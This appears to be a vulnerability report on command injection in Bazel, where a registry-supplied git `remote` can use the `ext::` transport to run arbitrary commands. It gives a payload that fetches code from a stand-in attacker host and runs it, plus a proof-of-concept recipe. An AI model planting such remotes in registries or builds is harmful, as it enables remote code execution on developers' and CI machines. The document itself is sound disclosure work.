### Title
OS Command Injection via `ext::` Git Transport in Registry-Supplied `git_repository` Source Specs - (File: tools/build_defs/repo/git_worker.bzl)

### Summary
The celery advisory describes a backend that trusts and blindly deserializes attacker-influenced metadata, letting an attacker who controls stored data reach an unsanitized code/command path. In Bazel's external-dependency machinery, a Bzlmod registry (an unprivileged, remote-served source of module metadata that a victim's build consumes) can supply a `source.json` with `"type": "git_repository"` whose `remote` field is forwarded verbatim, without validation or integrity binding, into `git_repository`'s implementation, which shells out to the system `git` binary [1](#0-0) .

### Finding Description
For archive-type module sources, the registry-declared `url` is bound to a `sha256`/`integrity` hash that Bazel verifies before trusting the bytes [2](#0-1) . For `git_repository`-type sources, however, the registry directly supplies `remote`, `commit`, `shallow_since`, `tag`, `init_submodules`, and `strip_prefix`, which are "directly forwarded to the underlying `git_repository` repo rule" [1](#0-0) . There is no integrity/allowlist check on the `remote` string itself — only the resulting checked-out `commit` is later recorded for reproducibility.

The `remote` attribute flows straight into `git remote add origin <remote>` and then `git fetch origin ...`: [3](#0-2) 

These git invocations are executed via `ctx.execute` with only a curated set of internal Git environment variables cleared; no `GIT_PROTOCOL_FROM_USER`, `GIT_ALLOW_PROTOCOL`, or `protocol.ext.allow=never` is set to restrict transport helpers: [4](#0-3) 

Git supports a `remote` URL scheme of the form `ext::<command>`, which executes an arbitrary shell command as the transport helper. Because Git's default policy for the `ext` protocol is `user` (allowed unless the caller explicitly opts out via `GIT_PROTOCOL_FROM_USER=0` or a restrictive `GIT_ALLOW_PROTOCOL`), and Bazel does neither here, a `remote` value such as `ext::sh -c "curl attacker.example|sh"` supplied by a hostile/compromised registry (or a mirror serving a different `source.json` than expected) is passed unmodified from `ctx.attr.remote` to `git remote add`/`git fetch`, causing the attacker's command to execute on the victim's machine during dependency fetching — well before any commit/content verification takes place.

This mirrors the celery bug class: content originating from an untrusted, attacker-controlled data source (the registry's metadata backend) is trusted implicitly and drives a command-execution primitive, rather than being treated purely as inert data.

### Impact Explanation
Successful exploitation grants arbitrary command execution on any machine (developer workstation or CI) that resolves a module depending — directly or transitively — on the malicious/compromised registry entry, during the loading/fetch phase, i.e., before build sandboxing or output verification occurs. This is a full local RCE from a remote, unprivileged data source (a registry or MITM'd mirror serving `source.json`), matching CVSS High severity given the network attack vector and complete compromise of confidentiality/integrity/availability of the victim's machine.

### Likelihood Explanation
The `git_repository` source type is a documented, supported alternative to `archive` type module sources in the Bzlmod registry protocol [1](#0-0) , so any registry (including custom/internal ones enabled via `--registry`, or a compromised/malicious BCR mirror) can serve such an entry. Because Bazel performs no allowlisting of the `remote` scheme and no `GIT_ALLOW_PROTOCOL` hardening, exploitation requires no misconfiguration on the victim's side beyond depending on (or being coerced via transitive deps into fetching) the malicious module version — a realistic supply-chain scenario.

### Recommendation
- Restrict git protocol/transport by always invoking git with `GIT_ALLOW_PROTOCOL=file:git:http:https` (or explicitly disabling `ext`) in `_execute`/`_git`/`add_origin` inside `tools/build_defs/repo/git_worker.bzl`, so registry- or user-supplied `remote` values cannot invoke the `ext::` command-execution transport.
- Additionally validate/allowlist the URL scheme of `ctx.attr.remote` in `git.bzl`/`git_worker.bzl` before use, rejecting `ext::`, `fd::`, and other non-network schemes unless explicitly opted in.
- Consider requiring registries to supply a verifiable digest binding for `git_repository`-type sources (e.g., pinning to `commit` and rejecting registry updates that change `remote` without lockfile re-verification).

### Proof of Concept
A `src/test/shell/bazel` integration test (or `BuildIntegrationTestCase`) can demonstrate this:
1. Set up a local index registry (as used in `src/test/py/bazel/bzlmod/test_utils.py`'s `BazelRegistry.addModule`) serving a module version whose `source.json` has `"type": "git_repository"` and `"remote": "ext::sh -c \"touch $TEST_TMPDIR/pwned\""`.
2. Add a `MODULE.bazel` `bazel_dep` on that module version, pointed at the malicious registry via `--registry=file://<registry_path>`.
3. Run `bazel build @that_module//:target`.
4. Observe that `$TEST_TMPDIR/pwned` is created — proving arbitrary command execution occurred during repository fetching, driven entirely by attacker-supplied registry metadata forwarded into `git remote add`/`git fetch` in `tools/build_defs/repo/git_worker.bzl` without any protocol restriction.

**Caveat / uncertainty:** I was unable to locate the specific Java class (e.g., an `ArchiveRepoSpecBuilder`/`GitRepoSpecBuilder` equivalent) that translates `source.json`'s `git_repository` type into the actual repo-rule instantiation, since the Java bzlmod sources did not surface in the available index (only `.bzl`/doc content was indexed for this path) — this should be confirmed in a full checkout via a Devin session before finalizing severity, to verify there is no additional server-side allowlist/sanitization applied to the `remote` field before it reaches `git.bzl`.

### Citations

**File:** docs/external/registry.mdx (L83-87)
```text
    *   `url`: A string, the URL of the source archive
    *   `mirror_urls`: A list of string, the mirror URLs of the source archive.
        The URLs are tried in order after `url` as backups.
    *   `integrity`: A string, the [Subresource
        Integrity][subresource-integrity] checksum of the archive
```

**File:** docs/external/registry.mdx (L105-111)
```text
*   If `type` is `git_repository`, this module version is backed by a
    [`git_repository`](/rules/lib/repo/git#git_repository) repo rule; it's
    fetched by cloning a Git repository.
    *   The following fields are supported, and are directly forwarded to the
        underlying `git_repository` repo rule: `remote`, `commit`,
        `shallow_since`, `tag`, `init_submodules`, `verbose`, and
        `strip_prefix`, `patch_strip`.
```

**File:** tools/build_defs/repo/git_worker.bzl (L158-176)
```text
def add_origin(ctx, git_repo, remote):
    _git(ctx, git_repo, "remote", "add", "origin", remote)

def fetch(ctx, git_repo):
    args = ["fetch", "origin"]

    sparse_checkout_patterns_or_file = \
        getattr(ctx.attr, "sparse_checkout_patterns", None) or \
        getattr(ctx.attr, "sparse_checkout_file", None)
    if sparse_checkout_patterns_or_file:
        if _git_sparse_checkout_config(ctx, git_repo):
            # Use filter to disable downloading file contents until we set the `sparse-checkout` patterns.
            args.append("--filter=blob:none")
        else:
            print("WARNING: Sparse checkout is not supported. Doing a full checkout.")
            sparse_checkout_patterns_or_file = None

    args.extend(["--", git_repo.fetch_ref])
    st = _git_maybe_shallow(ctx, git_repo, *args)
```

**File:** tools/build_defs/repo/git_worker.bzl (L289-319)
```text
# List of variables to unset when calling `git` to ensure no interference of
# operation. This is in the form of a dict that can be passed to `execute()`.
# This list is taken from the output of `git rev-parse --local-env-vars`
_GIT_LOCAL_ENV_VARS = {
    "GIT_ALTERNATE_OBJECT_DIRECTORIES": None,
    "GIT_CONFIG": None,
    "GIT_CONFIG_PARAMETERS": None,
    "GIT_CONFIG_COUNT": None,
    "GIT_OBJECT_DIRECTORY": None,
    "GIT_DIR": None,
    "GIT_WORK_TREE": None,
    "GIT_IMPLICIT_WORK_TREE": None,
    "GIT_GRAFT_FILE": None,
    "GIT_INDEX_FILE": None,
    "GIT_NO_REPLACE_OBJECTS": None,
    "GIT_REPLACE_REF_BASE": None,
    "GIT_PREFIX": None,
    "GIT_INTERNAL_SUPER_PREFIX": None,
    "GIT_SHALLOW_FILE": None,
    "GIT_COMMON_DIR": None,
}

def _execute(ctx, git_repo, args):
    # "core.fsmonitor=false" disables git from spawning a file system monitor which can cause hangs when cloning a lot.
    # See https://github.com/bazelbuild/bazel/issues/21438
    start = ["git", "-c", "core.fsmonitor=false"]
    return ctx.execute(
        start + args,
        environment = ctx.os.environ | _GIT_LOCAL_ENV_VARS,
        working_directory = str(git_repo.directory),
    )
```
